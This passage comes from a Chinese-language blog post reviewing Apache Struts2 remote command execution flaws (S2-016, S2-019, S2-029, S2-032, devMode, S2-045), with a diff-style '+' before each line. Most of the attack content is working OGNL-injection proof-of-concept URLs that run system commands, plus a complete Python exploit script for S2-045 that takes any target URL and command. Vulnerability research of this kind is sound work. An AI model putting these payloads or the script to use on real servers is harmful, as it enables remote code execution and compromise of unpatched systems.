+<p>修复摘要：删除 “action:”，”redirect:”，”redirectAction:” 这些前置前缀调用<br>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction:<br>作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意<br>OGNL 表达式，从而导致任意命令执行，经测试发现 redirect: 和 redirectAction:<br>这两个前缀比较好容易构造出命令执行的 Payload（转义后）</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>http://localhost:8080/S2-016/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%7D</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-016.png" alt=""></p>
+<h3 id="s2-019"><a href="#s2-019" class="headerlink" title="s2-019"></a>s2-019</h3><blockquote>
+<p>官方链接：<a href="http://struts.apache.org/docs/s2-019.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-019.html</a></p>
+<p>影响版本:Struts 2.0.0 - Struts 2.3.15.1</p>
+<p>因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。</p>
+</blockquote>
+<p>Poc:<br>获取web目录:</p>
+<pre><code>http://localhost:8080/S2-019/example/HelloWorld.action?debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-019.png" alt=""></p>
+<h3 id="s2-029"><a href="#s2-029" class="headerlink" title="s2-029"></a>s2-029</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-029.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-029.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.16</p>
+<p>修复摘要：限制传入标签属性的值，对其进行合规的正则验证 简单的说就是当开发者在模版中使用了类似如下的标签写法时，后端 Struts2<br>处理时会导致二次 OGNL 表达式执行的情况：</p>
+<p>&lt;s:textfield name=”%{message}”&gt;</s:textfield> 这里需要注意的是，仅当只有 name<br>属性这样写的情况下才能触发 OGNL 表达式执行，并且该标签中不能显示写有 value<br>属性。详细分析可参考天融信阿尔法实验室的张萌所写的<a href="http://blog.topsec.com.cn/ad_lab/struts2%E6%BC%8F%E6%B4%9Es2-029%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《struts2漏洞s2-029分析》</a></p>
+<p>到 S2-029 这里是，Struts2 已经增加了相当多的安全检测了，所以想要直接执行命令还需要通<br>过修改这些安全参数来绕过最后的执行检测，具体的安全参数版本差异同样可参考上面的详细分析文章。</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>http://localhost:8080/S2-029/default.action?message=(%23_memberAccess[&apos;allowPrivateAccess&apos;]=true,%23_memberAccess[&apos;allowProtectedAccess&apos;]=true,%23_memberAccess[&apos;excludedPackageNamePatterns&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;excludedClasses&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;allowPackageProtectedAccess&apos;]=true,%23_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream()))</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-029.png" alt=""></p>
+<h3 id="s2-032"><a href="#s2-032" class="headerlink" title="s2-032"></a>s2-032</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-032.html</a></p>
+<p>影响版本：Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<p>修复摘要：过滤通过 method: 传入的 action 名称，限制其字符范围 protected Pattern<br>allowedActionNames = Pattern.compile(“[a-zA-Z0-9._!/-]*”); 在配置了<br>Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public<br>的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI<br>的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL<br>计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</p>
+<p>要成功利用必须要开 DMI 才可以：</p>
+<constant name="struts.enable.DynamicMethodInvocation" value="true" />
+找到目标应用有效的 Action 例如 index.action，那么直接使用 DMI 在 method: 后面带上需要执行 OGNL表达式即可（注意转义)
+</blockquote>
+<p>Poc:<br>获取web目录：</p>
+<pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8&amp;web=web&amp;path=path%3a</code></pre><p>命令执行：</p>
+<pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=whoami</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-032.png" alt=""></p>
+<h3 id="s2-devMode"><a href="#s2-devMode" class="headerlink" title="s2-devMode"></a>s2-devMode</h3><p>影响：Struts 2.1.0–2.5.1</p>
+<p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<p>Poc:</p>
+<pre><code>http://localhost:8080/S2-devMode/orders/3/?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=netstat -ano</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-devmode.png" alt=""></p>
+<h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>官方链接：<a href="http://struts.apache.org/docs/s2-045.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-045.html</a></p>
+<p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
+<p>通过Content-Type这个header头，注入OGNL语言，进而执行命令。</p>
+<p>Poc：</p>
+<pre><code>#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import urllib2
+import httplib
+
+
+def exploit(url, cmd):
+    payload = &quot;%{(#_=&apos;multipart/form-data&apos;).&quot;
+    payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;
+    payload += &quot;(#_memberAccess?&quot;
+    payload += &quot;(#_memberAccess=#dm):&quot;
+    payload += &quot;((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).&quot;
+    payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;
+    payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;
+    payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot;
+    payload += &quot;(#context.setMemberAccess(#dm)))).&quot;
+    payload += &quot;(#cmd=&apos;%s&apos;).&quot; % cmd
+    payload += &quot;(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).&quot;
+    payload += &quot;(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).&quot;
+    payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;
+    payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot;
+    payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;
+    payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;
+    payload += &quot;(#ros.flush())}&quot;
+
+    try:
+        headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0&apos;, &apos;Content-Type&apos;: payload}
+        request = urllib2.Request(url, headers=headers)
+        page = urllib2.urlopen(request).read()
+    except httplib.IncompleteRead, e:
+        page = e.partial
+
+    print(page)
+    return page
+
+
+if __name__ == &apos;__main__&apos;:
+    import sys
+    if len(sys.argv) != 3:
+        print(&quot;[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;&quot;)
+    else:
+        print(&apos;[*] CVE: 2017-5638 - Apache Struts2 S2-045&apos;)
+        url = sys.argv[1]
+        cmd = sys.argv[2]
+        print(&quot;[*] cmd: %s\n&quot; % cmd)
+        exploit(url, cmd)</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-045.png" alt=""></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">Struts2 历史 RCE 漏洞回顾不完全系列</a></li>
+<li><a href="http://blog.0kami.cn/2017/01/13/Struts2-history-payload/" target="_blank" rel="noopener">Struts2命令执行集合</a></li>
+<li><a href="https://github.com/phith0n/vulhub/tree/master/struts2" target="_blank" rel="noopener">vulhub</a></li>
+<li><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">VulApps</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ongl表达式"><span class="toc-number">1.</span> <span class="toc-text">ongl表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#触发途径"><span class="toc-number">2.</span> <span class="toc-text">触发途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-001"><span class="toc-number">3.</span> <span class="toc-text">s2-001</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-007"><span class="toc-number">4.</span> <span class="toc-text">s2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-008"><span class="toc-number">5.</span> <span class="toc-text">s2-008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-012"><span class="toc-number">6.</span> <span class="toc-text">s2-012</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-013-s2-014"><span class="toc-number">7.</span> <span class="toc-text">s2-013/s2-014</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-015"><span class="toc-number">8.</span> <span class="toc-text">s2-015</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-16"><span class="toc-number">9.</span> <span class="toc-text">s2-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-019"><span class="toc-number">10.</span> <span class="toc-text">s2-019</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-029"><span class="toc-number">11.</span> <span class="toc-text">s2-029</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-032"><span class="toc-number">12.</span> <span class="toc-text">s2-032</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-devMode"><span class="toc-number">13.</span> <span class="toc-text">s2-devMode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-045"><span class="toc-number">14.</span> <span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">15.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&text=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&is_video=false&description=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Struts2命令执行系列回顾&body=Check out this article: http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&name=Struts2命令执行系列回顾&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
